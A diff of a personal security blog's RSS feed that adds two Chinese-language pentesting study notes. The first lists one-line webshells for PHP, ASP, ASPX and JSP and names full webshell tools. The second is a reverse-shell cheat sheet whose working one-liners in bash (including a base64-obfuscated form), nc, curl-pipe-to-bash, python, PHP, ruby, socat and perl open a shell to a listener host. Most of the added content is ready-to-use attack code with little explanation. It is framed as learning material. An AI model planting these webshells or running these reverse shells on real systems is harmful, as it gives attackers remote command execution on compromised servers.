@@ -8,8 +8,8 @@ Feel free to mail me if you have something wanted to talk about, plz
 mail: &amp;lt;moyaoxue@outlook.com&amp;gt;
 </description>
         <language>en</language>
-        <pubDate>Wed, 08 May 2024 00:31:13 +0800</pubDate>
-        <lastBuildDate>Wed, 08 May 2024 00:31:13 +0800</lastBuildDate>
+        <pubDate>Sun, 12 May 2024 15:15:13 +0800</pubDate>
+        <lastBuildDate>Sun, 12 May 2024 15:15:13 +0800</lastBuildDate>
         <category>re</category>
         <category>Android</category>
         <category>开发</category>
@@ -28,6 +28,72 @@ mail: &amp;lt;moyaoxue@outlook.com&amp;gt;
         <category>python</category>
         <category>hexo</category>
         <category>car</category>
+        <category>ios</category>
+        <category>pentesting</category>
+        <item>
+            <guid isPermalink="true">https://demoyao100.github.io/web-shell%E6%80%BB%E7%BB%93/</guid>
+            <title>web shell总结</title>
+            <link>https://demoyao100.github.io/web-shell%E6%80%BB%E7%BB%93/</link>
+            <category>web</category>
+            <pubDate>Sun, 12 May 2024 15:15:13 +0800</pubDate>
+            <description><![CDATA[ &lt;p&gt;PREFACE：学学渗透，补补基础&lt;/p&gt;
+&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;
+&lt;h3 id=&#34;一-句话木马&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#一-句话木马&#34;&gt;#&lt;/a&gt; 一、句话木马：&lt;/h3&gt;
+&lt;h4 id=&#34;1-php&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#1-php&#34;&gt;#&lt;/a&gt; 1 php：&lt;/h4&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt;?php @eval&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$_POST&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;‘cmd’&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; ?&lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;比较经典我也认识，后续可能看到一些变种填这里&lt;/p&gt;
+&lt;h4 id=&#34;2-asp&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#2-asp&#34;&gt;#&lt;/a&gt; 2 ASP：&lt;/h4&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt;%eval request&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;“cmd”&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;%&lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;strong&gt;动态服务器网页&lt;/strong&gt;（英文：&lt;strong&gt;A&lt;/strong&gt;ctive &lt;strong&gt;S&lt;/strong&gt;erver &lt;strong&gt;P&lt;/strong&gt;ages，简称&lt;strong&gt; ASP&lt;/strong&gt;），是由微软公司开发的服务器端运行的脚本平台，它被 Windows 下 Internet Information Services (IIS) 的程序所管理。透过 ActiveX server 的技术让不同的用户能有不同的画面，或需要让他们可以访问服务器（server）上的资料时，使用 ASP3.0 中提供了五个内置的对象建立模拟和安全性的动态内容，来协助程序员隐藏复杂的沟通机制，让程序员可以专注在解决问题和应用之上，这样可以更快速地开发动态网页的同时每一个组件都是可以由一组富有经验的程序员根据动态网页最常用的功能而独立开发。&lt;/p&gt;
+&lt;p&gt;ASP 脚本原生支持通过&lt;strong&gt; VBScript&lt;/strong&gt; 和&lt;strong&gt; JScript&lt;/strong&gt; 两种脚本语言来建立动态页面，本质上是将 PC 端的脚本执行能力迁移到了服务器。使用 ASP 技术构建的网站，通常都是部署在 IIS 或 PWS 服务器上。&lt;/p&gt;
+&lt;p&gt;借用一个简图表示浏览器请求一个 ASP 脚本的流程：&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/web-shell%E6%80%BB%E7%BB%93/Untitled.png&#34; alt=&#34;Untitled&#34;&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;当 Web 应用服务器 (IIS) 判断出请求是访问 ASP 脚本后，自动通过 Isapi 模块调用 ASP 脚本的解释运行引擎 asp.dll。asp.dll 从文件系统或内部缓冲区中获取 ASP 脚本的文本内容，然后进行语法分析并解释执行。&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h4 id=&#34;3-aspx&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#3-aspx&#34;&gt;#&lt;/a&gt; 3 ASPX：&lt;/h4&gt;
+&lt;p&gt;&lt;a href=&#34;http://ASP.NET&#34;&gt;ASP.NET&lt;/a&gt;，新一代 ASP，需要编译，速度比 ASP 快，其它差不太多&lt;/p&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt;%@ Page &lt;span class=&#34;token assign-left variable&#34;&gt;Language&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;”Jscript”%&lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt;%eval&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;Request.Item&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;“cmd”&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;,”unsafe”&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;%&lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h4 id=&#34;4-jsp&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#4-jsp&#34;&gt;#&lt;/a&gt; 4 JSP：&lt;/h4&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt;%Runtime.getRuntime&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;.exec&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;request.getParameter&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;cmd&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;))&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;%&lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;​	Java Server Pages (JSP) is a server-side programming technology that enables the creation of dynamic, platform-independent method for building Web-based applications. JSP have access to the entire family of Java APIs.&lt;/p&gt;
+&lt;p&gt;有这样的过程： &lt;code&gt;.jsp&lt;/code&gt;  -&amp;gt;  &lt;code&gt;.java&lt;/code&gt;  -&amp;gt;  &lt;code&gt;.class&lt;/code&gt;&lt;/p&gt;
+&lt;h3 id=&#34;大马&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#大马&#34;&gt;#&lt;/a&gt; 大马&lt;/h3&gt;
+&lt;p&gt;目前准备了&lt;/p&gt;
+&lt;h4 id=&#34;1-冰蝎&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#1-冰蝎&#34;&gt;#&lt;/a&gt; 1 冰蝎&lt;/h4&gt;
+&lt;h4 id=&#34;2-蚁剑&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#2-蚁剑&#34;&gt;#&lt;/a&gt; 2 蚁剑&lt;/h4&gt;
+&lt;h4 id=&#34;3-哥斯拉&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#3-哥斯拉&#34;&gt;#&lt;/a&gt; 3 哥斯拉&lt;/h4&gt;
+&lt;p&gt;参考：&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://xz.aliyun.com/t/2356?time__1311=n4%2BxnieDqWqxyAQD%2FWTYhED9Dmg6xGTw%2BD&amp;amp;alichlgref=https%3A%2F%2Fwww.bing.com%2F&#34;&gt;构造免杀的 asp 一句话木马 - 先知社区 (aliyun.com)&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://medium.com/@m01e/jsp-webshell-cookbook-part-1-6836844ceee7&#34;&gt;JSP Webshell Cookbook: Part-1. Preface | by jdlkajflkd | Medium&lt;/a&gt;&lt;/p&gt;
+ ]]></description>
+        </item>
+        <item>
+            <guid isPermalink="true">https://demoyao100.github.io/%E5%8F%8D%E5%BC%B9shell%E6%80%BB%E7%BB%93/</guid>
+            <title>反弹shell总结</title>
+            <link>https://demoyao100.github.io/%E5%8F%8D%E5%BC%B9shell%E6%80%BB%E7%BB%93/</link>
+            <category>web</category>
+            <pubDate>Sun, 12 May 2024 15:15:05 +0800</pubDate>
+            <description><![CDATA[ &lt;p&gt;PREFACE：学学渗透，补补基础&lt;/p&gt;
+&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;
+&lt;h3 id=&#34;一-linux下反弹shell&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#一-linux下反弹shell&#34;&gt;#&lt;/a&gt; 一、linux 下反弹 shell&lt;/h3&gt;
+&lt;h4 id=&#34;1-bash-反弹&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#1-bash-反弹&#34;&gt;#&lt;/a&gt; 1 bash 反弹&lt;/h4&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;bash&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-i&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;&gt;&amp;amp;&lt;/span&gt; /dev/tcp/192.168.2.102/7777 &lt;span class=&#34;token operator&#34;&gt;&lt;span class=&#34;token file-descriptor important&#34;&gt;0&lt;/span&gt;&gt;&lt;/span&gt;&lt;span class=&#34;token file-descriptor important&#34;&gt;&amp;amp;1&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;code&gt;0&amp;gt;&amp;amp;1&lt;/code&gt;  表示重定向输出，将标准输入（STDIN）输出到标准输出（STDOUT）&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;&amp;gt;&amp;amp; /dev/tcp/192.168.2.102/7777&lt;/code&gt; : 重定向输出。 &lt;code&gt;&amp;gt;&amp;amp;&lt;/code&gt;  将标准输出（STDOUT）和标准错误输出（STDERR）都重定向到指定位置。&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;bash -i&lt;/code&gt;  指定 bash 在交互模式下运行，即这里可以与远程 vps 交互&lt;/p&gt;
+&lt;p&gt;可以通过 base64 反弹：&lt;/p&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;bash&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-c&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;&amp;#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIuMTAyLzQ0NDQgMD4mMQ==&amp;#125;|&amp;#123;base64,-d&amp;#125;|&amp;#123;bash,-i&amp;#125;&#39;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;接收：&lt;/p&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;nc&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-lvp&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;7777&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h4 id=&#34;2-nc反弹&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#2-nc反弹&#34;&gt;#&lt;/a&gt; 2 nc 反弹&lt;/h4&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;nc&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-e&lt;/span&gt; /bin/bash &lt;span class=&#34;token number&#34;&gt;192.168&lt;/span&gt;.2.102 &lt;span class=&#34;token number&#34;&gt;4444&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;在远程连接一个本地 shell&lt;/p&gt;
+&lt;h4 id=&#34;3-curl反弹&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#3-curl反弹&#34;&gt;#&lt;/a&gt; 3 curl 反弹&lt;/h4&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;curl&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;192.168&lt;/span&gt;.2.103/bash.html&lt;span class=&#34;token operator&#34;&gt;|&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;bash&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;注：bash.html 里面写的是 &lt;code&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.2.102/7777 0&amp;gt;&amp;amp;1&lt;/code&gt;&lt;/p&gt;
+&lt;h4 id=&#34;4-whois-反弹&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#4-whois-反弹&#34;&gt;#&lt;/a&gt; 4 whois 反弹&lt;/h4&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;whois &lt;span class=&#34;token parameter variable&#34;&gt;-h&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;192.168&lt;/span&gt;.2.102 &lt;span class=&#34;token parameter variable&#34;&gt;-p&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;4444&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;&lt;span class=&#34;token variable&#34;&gt;`&lt;/span&gt;&lt;span class=&#34;token builtin class-name&#34;&gt;pwd&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;`&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;反弹的 shell 后面只能执行后面带的命令&lt;/p&gt;
+&lt;h4 id=&#34;5-python反弹&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#5-python反弹&#34;&gt;#&lt;/a&gt; 5 python 反弹&lt;/h4&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;python &lt;span class=&#34;token parameter variable&#34;&gt;-c&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;192.168.2.102&#34;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&#34;/bin/sh&#34;,&#34;-i&#34;]);&#39;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h4 id=&#34;6-php反弹&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#6-php反弹&#34;&gt;#&lt;/a&gt; 6 PHP 反弹&lt;/h4&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;php &lt;span class=&#34;token parameter variable&#34;&gt;-r&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;$sock=fsockopen(&#34;192.168.2.102&#34;,4444);exec(&#34;/bin/sh -i &amp;lt;&amp;amp;3 &gt;&amp;amp;3 2&gt;&amp;amp;3&#34;);&#39;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h4 id=&#34;7-ruby反弹&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#7-ruby反弹&#34;&gt;#&lt;/a&gt; 7 ruby 反弹&lt;/h4&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;ruby &lt;span class=&#34;token parameter variable&#34;&gt;-rsocket&lt;/span&gt; -e&lt;span class=&#34;token string&#34;&gt;&#39;f=TCPSocket.open(&#34;192.168.2.102&#34;,4444).to_i;exec sprintf(&#34;/bin/sh -i &amp;lt;&amp;amp;%d &gt;&amp;amp;%d 2&gt;&amp;amp;%d&#34;,f,f,f)&#39;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h4 id=&#34;8-socat反弹&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#8-socat反弹&#34;&gt;#&lt;/a&gt; 8 socat 反弹&lt;/h4&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;socat exec:&lt;span class=&#34;token string&#34;&gt;&#39;bash -li&#39;&lt;/span&gt;,pty,stderr,setsid,sigint,sane tcp:192.168.2.102:4444&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h4 id=&#34;9-perl反弹&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#9-perl反弹&#34;&gt;#&lt;/a&gt; 9 Perl 反弹&lt;/h4&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;perl &lt;span class=&#34;token parameter variable&#34;&gt;-e&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;use Socket;$i=&#34;192.168.2.102&#34;;$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&#34;tcp&#34;));if(connect(S,sockaddr_in($p,inet_aton($i))))&amp;#123;open(STDIN,&#34;&gt;&amp;amp;S&#34;);open(STDOUT,&#34;&gt;&amp;amp;S&#34;);open(STDERR,&#34;&gt;&amp;amp;S&#34;);exec(&#34;/bin/sh -i&#34;);&amp;#125;;&#39;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h3 id=&#34;二-windows下反弹shell&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#二-windows下反弹shell&#34;&gt;#&lt;/a&gt; 二、windows 下反弹 shell&lt;/h3&gt;
+&lt;p&gt;看了一下，应用场景对比 c2 WebDelivery 几乎没有任何优势，先不整理了…&lt;/p&gt;
+ ]]></description>
+        </item>
         <item>
             <guid isPermalink="true">https://demoyao100.github.io/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%9D%E6%8E%A2/</guid>
             <title>反序列化初探</title>
